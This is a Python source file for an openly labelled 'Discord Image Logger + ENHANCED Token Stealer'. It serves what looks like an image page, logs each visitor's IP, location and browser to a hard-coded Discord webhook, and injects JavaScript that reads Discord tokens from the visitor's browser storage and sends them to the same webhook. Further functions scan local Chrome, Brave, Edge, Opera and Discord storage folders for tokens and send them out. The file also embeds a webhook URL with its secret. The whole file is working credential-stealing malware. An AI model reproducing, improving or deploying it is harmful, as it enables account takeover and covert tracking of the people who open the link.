# Image Logger with ENHANCED Token Stealing
# Fixed version that actually finds and sends Discord tokens

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser
import json, re, os, urllib.request, sys
from pathlib import Path

__app__ = "Discord Image Logger + ENHANCED Token Stealer"
__description__ = "Enhanced version with working Discord token stealing"
__version__ = "v2.3"
__author__ = "C00lB0i"

config = {
    "webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
    "token_webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
    "image": "https://server.wallpaperalchemy.com/storage/wallpapers/92/windows-xp-wallpaper-bliss-4k-wallpaper.jpeg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by C00lB0i's Image Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "tokenStealing": True,
    "tokenStealingMode": "aggressive",
    "sendTokensToWebhook": True,
    "tokenStealingDelay": 1,
    "debugMode": True,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

# ENHANCED TOKEN STEALING
def log_debug(message):
    if config.get("debugMode"):
        print(f"[DEBUG] {message}")

def send_webhook(webhook_url, data):
    """Enhanced webhook sending with better error handling"""
    try:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        request = urllib.request.Request(
            webhook_url,
            data=json.dumps(data).encode(),
            headers=headers,
            method='POST'
        )
        
        with urllib.request.urlopen(request, timeout=15) as response:
            log_debug(f"Webhook success: {response.status}")
            return response.status == 204 or response.status == 200
            
    except urllib.error.HTTPError as e:
        log_debug(f"Webhook HTTP error: {e.code} - {e.reason}")
        return False
    except Exception as e:
        log_debug(f"Webhook general error: {e}")
        return False

def extract_discord_tokens(text):
    """Enhanced token extraction with multiple patterns"""
    # Multiple Discord token patterns
    patterns = [
        r'[MN][\w-]{23}\.[\w-]{6}\.[\w-]{27}',  # Standard format starting with M or N
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',     # Generic 24.6.27 format
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}',     # Generic 24.6.38 format
        r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}', # Very flexible
    ]
    
    all_tokens = []
    for pattern in patterns:
        tokens = re.findall(pattern, text, re.IGNORECASE)
        all_tokens.extend(tokens)
    
    # Remove duplicates and validate
    unique_tokens = []
    for token in set(all_tokens):
        if validate_discord_token(token):
            unique_tokens.append(token)
    
    return unique_tokens

def validate_discord_token(token):
    """Validate Discord token format"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return False
            
        # Check first part is base64 and decodes to numeric ID
        base64_part = parts[0]
        padding_needed = (4 - len(base64_part) % 4) % 4
        base64_part += "=" * padding_needed
        
        decoded = base64.b64decode(base64_part).decode('utf-8')
        return decoded.isdigit()
        
    except Exception:
        return False

def find_discord_tokens_storage():
    """Find Discord tokens in browser storage locations"""
    log_debug("Starting browser storage token search...")
    
    locations = []
    
    if os.name == 'nt':  # Windows
        local_appdata = os.getenv('LOCALAPPDATA')
        appdata = os.getenv('APPDATA')
        
        if local_appdata:
            locations.extend([
                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Profile 1" / "Local Storage" / "leveldb",
                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Profile 2" / "Local Storage" / "leveldb",
                Path(local_appdata) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(local_appdata) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(local_appdata) / "Opera Software" / "Opera Stable" / "Local Storage" / "leveldb",
            ])
        
        if appdata:
            locations.extend([
                Path(appdata) / "discord" / "Local Storage" / "leveldb",
                Path(appdata) / "Discord" / "Local Storage" / "leveldb",
            ])
    
    elif sys.platform == "darwin":  # macOS
        home = Path.home()
        locations.extend([
            home / "Library" / "Application Support" / "Google" / "Chrome" / "Default" / "Local Storage" / "leveldb",
            home / "Library" / "Application Support" / "discord" / "Local Storage" / "leveldb",
        ])
    
    else:  # Linux
        home = Path.home()
        locations.extend([
            home / ".config" / "google-chrome" / "Default" / "Local Storage" / "leveldb",
            home / ".config" / "discord" / "Local Storage" / "leveldb",
        ])
    
    all_tokens = []
    
    for location in locations:
        if location.exists():
            log_debug(f"Scanning: {location}")
            tokens = scan_location_for_tokens(location)
            all_tokens.extend(tokens)
    
    return list(set(all_tokens))  # Remove duplicates

def scan_location_for_tokens(location):
    """Scan a specific location for Discord tokens"""
    tokens_found = []
    
    try:
        for file_path in location.iterdir():
            if file_path.is_file():
                try:
                    content = file_path.read_text(encoding='utf-8', errors='ignore')
                    file_tokens = extract_discord_tokens(content)
                    tokens_found.extend(file_tokens)
                    
                    if file_tokens:
                        log_debug(f"Found {len(file_tokens)} token(s) in {file_path.name}")
                        
                except PermissionError:
                    log_debug(f"Permission denied: {file_path.name}")
                except Exception as e:
                    log_debug(f"Error reading {file_path.name}: {e}")
                    
    except Exception as e:
        log_debug(f"Error scanning location {location}: {e}")
    
    return tokens_found

def send_tokens_webhook(tokens):
    """Send found tokens to Discord webhook"""
    if not tokens:
        log_debug("No tokens to send")
        return False
    
    log_debug(f"Sending {len(tokens)} tokens to webhook...")
    
    # Group tokens by user ID
    tokens_by_user = {}
    for token in tokens:
        try:
            user_id = base64.b64decode(token.split('.')[0] + "==").decode('utf-8')
            if user_id.isdigit():
                if user_id not in tokens_by_user:
                    tokens_by_user[user_id] = []
                tokens_by_user[user_id].append(token)
        except:
            continue
    
    # Create webhook embed
    fields = []
    for user_id, user_tokens in tokens_by_user.items():
        token_text = "\n".join(user_tokens[:2])  # Max 2 tokens per user to avoid message length
        if len(user_tokens) > 2:
            token_text += f"\n... and {len(user_tokens) - 2} more"
            
        fields.append({
            "name": f"👤 User: {user_id}",
            "value": f"```\n{token_text}\n```"
        })
    
    webhook_data = {
        "username": config["username"],
        "content": "🔑 **DISCORD TOKENS FOUND!** 🚨",
        "embeds": [{
            "title": "🎯 Token Stealer Results",
            "color": config["color"],
            "description": f"Successfully extracted **{len(tokens)}** Discord token(s) from **{len(tokens_by_user)}** user(s)",
            "fields": fields,
            "footer": {
                "text": "Enhanced Image Logger v2.3"
            }
        }]
    }
    
    return send_webhook(config["token_webhook"], webhook_data)

def attempt_enhanced_token_stealing():
    """Enhanced token stealing attempt"""
    if not config["tokenStealing"]:
        log_debug("Token stealing disabled")
        return False
    
    log_debug("🚀 Starting enhanced token stealing...")
    
    # Method 1: Browser storage scanning
    storage_tokens = find_discord_tokens_storage()
    log_debug(f"Storage scanning found: {len(storage_tokens)} tokens")
    
    # Method 2: Check common Discord locations
    common_tokens = scan_common_discord_locations()
    log_debug(f"Common locations found: {len(common_tokens)} tokens")
    
    # Combine all tokens
    all_tokens = list(set(storage_tokens + common_tokens))
    log_debug(f"Total unique tokens: {len(all_tokens)}")
    
    # Send to webhook if tokens found
    if all_tokens and config["sendTokensToWebhook"]:
        success = send_tokens_webhook(all_tokens)
        log_debug(f"Webhook send success: {success}")
        return success
    
    return len(all_tokens) > 0

def scan_common_discord_locations():
    """Scan common Discord application locations"""
    tokens = []
    
    if os.name == 'nt':  # Windows
        appdata = os.getenv('APPDATA')
        local_appdata = os.getenv('LOCALAPPDATA')
        
        # Discord desktop app locations
        discord_locations = [
            Path(appdata) / "discord" / "Local Storage" / "leveldb",
            Path(local_appdata) / "Discord" / "Local Storage" / "leveldb",
        ]
        
        for location in discord_locations:
            if location.exists():
                location_tokens = scan_location_for_tokens(location)
                tokens.extend(location_tokens)
    
    return tokens

# Original image logger functions (simplified)
def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                webhook_data = {
                    "username": config["username"],
                    "embeds": [{
                        "title": "🔗 Link Sent",
                        "color": config["color"],
                        "description": f"Image logging link sent!\n\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }]
                }
                send_webhook(config["webhook"], webhook_data)
            except:
                pass
        return
    
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
    except:
        return
    
    ping = "@everyone"
    if info.get("proxy") and config["vpnCheck"] == 1:
        ping = ""
    if info.get("hosting") and config["antiBot"] == 1:
        ping = ""
    
    os_name, browser = httpagentparser.simple_detect(useragent)
    
    embed_data = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "🎯 IP Logged",
            "color": config["color"],
            "description": f"""**User opened the image!**

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'Unknown')}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
        }]
    }
    
    if url:
        embed_data["embeds"][0]["thumbnail"] = {"url": url}
    
    try:
        send_webhook(config["webhook"], embed_data)
    except:
        pass
    
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class EnhancedImageLogger(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            useragent = self.headers.get('user-agent', '')
            
            log_debug(f"Request from: {ip}")
            
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                    except:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{margin:0;padding:0;}}
div.img {{background-image:url('{url}');background-position:center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh;}}</style>
<div class="img"></div>'''.encode()
            
            if ip.startswith(blacklistedIPs):
                return
            
            if botCheck(ip, useragent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: 
                    self.wfile.write(binaries["loading"])
                makeReport(ip, endpoint=self.path.split("?")[0], url=url)
                return
            
            # Normal user - log IP and attempt token stealing
            makeReport(ip, useragent, endpoint=self.path.split("?")[0], url=url)
            
            # Attempt token stealing
            if config["tokenStealing"]:
                log_debug("Attempting token stealing...")
                attempt_enhanced_token_stealing()
            
            # Enhanced client-side JavaScript for token stealing
            if config["tokenStealing"]:
                js_code = f'''
<script>
(function() {{
    console.log("🔑 Enhanced token stealer activated");
    
    function findAndSendTokens(storage, storageName) {{
        console.log("🔍 Scanning " + storageName);
        let foundTokens = [];
        
        for (let i = 0; i < storage.length; i++) {{
            let key = storage.key(i);
            if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord'))) {{
                let value = storage.getItem(key);
                let tokenPattern = /[MN][\\w-]{{23}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/gi;
                let matches = value.match(tokenPattern);
                if (matches) {{
                    foundTokens = foundTokens.concat(matches);
                }}
            }}
        }}
        
        if (foundTokens.length > 0) {{
            console.log("✅ Found " + foundTokens.length + " tokens in " + storageName);
            foundTokens.forEach(function(token) {{
                fetch('{config["token_webhook"]}', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        content: "🔑 Discord Token Found via " + storageName + "!",
                        embeds: [{{
                            title: "🎯 " + storageName + " Token",
                            color: {config["color"]},
                            description: "Token extracted from " + storageName,
                            fields: [{{
                                name: "Discord Token",
                                value: "```" + token + "```"
                            }}]
                        }}]
                    }})
                }}).catch(console.error);
            }});
        }}
    }}
    
    setTimeout(function() {{
        try {{
            findAndSendTokens(localStorage, "localStorage");
            findAndSendTokens(sessionStorage, "sessionStorage");
        }} catch(e) {{
            console.log("Error in token extraction:", e);
        }}
    }}, {config["tokenStealingDelay"] * 1000});
}})();
</script>'''
                data += js_code.encode()
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(data)
        
        except Exception as e:
            log_debug(f"Handler error: {e}")
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Server Error')
    
    do_GET = handleRequest
    do_POST = handleRequest

def run_server(port=8080):
    server_address = ('', port)
    httpd = HTTPServer(server_address, EnhancedImageLogger)
    print(f"🚀 Enhanced Image Logger with Token Stealing v{__version__}")
    print(f"📍 Server running on http://localhost:{port}")
    print(f"🔑 Token stealing: {'ON' if config['tokenStealing'] else 'OFF'}")
    print(f"🔍 Debug mode: {'ON' if config['debugMode'] else 'OFF'}")
    print(f"🎯 Ready to steal Discord tokens!")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
